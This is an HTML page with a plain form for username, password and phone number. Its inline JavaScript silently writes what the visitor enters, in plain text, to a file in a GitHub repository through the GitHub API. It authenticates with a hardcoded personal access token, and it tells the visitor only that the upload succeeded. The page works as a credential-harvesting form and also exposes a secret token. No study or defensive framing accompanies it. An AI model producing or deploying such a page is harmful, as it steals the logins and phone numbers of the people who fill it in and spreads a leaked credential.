<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Input Form</title>
    <script>
        async function uploadToGitHub() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const phone = document.getElementById('phone').value;

            const token = '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'; // Your GitHub token
            const fileContent = `Username: ${username}\nPassword: ${password}\nPhone: ${phone}\n\n`;
            const repo = 'ukgkings/Server';
            const path = 'server.txt';

            // Fetch the file's current SHA to update it
            const getSHAResponse = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
                method: 'GET',
                headers: {
                    'Authorization': `token ${token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });
            const shaData = await getSHAResponse.json();
            const sha = shaData.sha;

            // Prepare the new content (base64 encoded)
            const newContent = btoa(unescape(encodeURIComponent(fileContent))); // Base64 encode the content

            // Make the PUT request to update the file
            await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${token}`,
                    'Accept': 'application/vnd.github.v3+json'
                },
                body: JSON.stringify({
                    message: "Updating server.txt with new input",
                    content: newContent,
                    sha: sha
                })
            });

            alert("Data uploaded successfully!");
        }
    </script>
</head>
<body>
    <h1>Enter Your Information</h1>
    <form onsubmit="uploadToGitHub(); return false;">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>

        <label for="phone">Phone Number:</label>
        <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required><br><br>

        <input type="submit" value="Submit">
    </form>
</body>
</html>
